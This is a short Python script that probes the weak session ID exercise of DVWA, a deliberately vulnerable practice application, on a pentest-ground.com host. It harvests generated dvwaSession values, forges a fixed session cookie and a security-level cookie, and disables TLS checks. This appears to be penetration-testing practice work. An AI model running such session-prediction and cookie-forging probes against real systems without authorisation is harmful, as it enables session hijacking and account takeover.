import requests

url = "https://pentest-ground.com:4280/vulnerabilities/weak_id/"

print("Testing session hijack potential...")
print("=" * 60)

# Test if we can set our own dvwaSession value
session = requests.Session()
session.verify = False

# First establish a session
resp = session.get(url)
print(f"Initial cookies: {session.cookies.get_dict()}")

# Generate a few sessions
for i in range(3):
    resp = session.post(url)
    print(f"POST {i+1}: dvwaSession={resp.cookies.get('dvwaSession')}")

# Now try to set a specific session value and see if it persists
print("\nTrying to set dvwaSession=999 manually...")
session.cookies.set('dvwaSession', '999', domain='pentest-ground.com', path='/')
resp = session.get(url)
print(f"After setting dvwaSession=999, GET response cookies: {resp.cookies.get_dict()}")

# Check if the session persists
resp = session.post(url)
print(f"POST after manual set: dvwaSession={resp.cookies.get('dvwaSession')}")

# Test different security levels
print("\n" + "=" * 60)
print("Testing other security levels...")
for level in ['low', 'medium', 'high']:
    session2 = requests.Session()
    session2.verify = False
    session2.cookies.set('security', level, domain='pentest-ground.com', path='/')
    resp = session2.get(url)
    print(f"\nSecurity level: {level}")
    print(f"  Initial cookies: {resp.cookies.get_dict()}")
    resp = session2.post(url)
    print(f"  POST 1: dvwaSession={resp.cookies.get('dvwaSession')}")
    resp = session2.post(url)
    print(f"  POST 2: dvwaSession={resp.cookies.get('dvwaSession')}")
    resp = session2.post(url)
    print(f"  POST 3: dvwaSession={resp.cookies.get('dvwaSession')}")
